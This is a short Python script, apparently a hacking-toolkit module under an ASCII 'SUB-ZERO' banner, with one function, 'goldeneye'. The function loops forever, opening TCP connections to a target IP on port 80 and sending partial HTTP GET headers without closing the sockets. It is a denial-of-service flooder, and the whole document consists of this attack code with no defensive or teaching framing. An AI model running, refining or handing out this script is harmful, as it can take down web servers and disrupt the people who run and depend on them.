import socket
import random
import time
'''
        ███████╗██╗   ██╗██████╗      ███████╗███████╗██████╗  ██████╗     
        ██╔════╝██║   ██║██╔══██╗     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    
        ███████╗██║   ██║██████╔╝█████╗ ███╔╝ █████╗  ██████╔╝██║   ██║    
        ╚════██║██║   ██║██╔══██╗╚════╝███╔╝  ██╔══╝  ██╔══██╗██║   ██║    
        ███████║╚██████╔╝██████╔╝     ███████╗███████╗██║  ██║╚██████╔╝    
        ╚══════╝ ╚═════╝ ╚═════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     
                                                                           
'''

def goldeneye(target_ip):
    headers = "GET / HTTP/1.1\r\nHost: {}\r\n".format(target_ip)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 80))
            s.send(headers.encode())
            time.sleep(random.uniform(0.1, 1))
        except Exception as e:
            print(f"Error during GoldenEye attack: {e}")
            continue
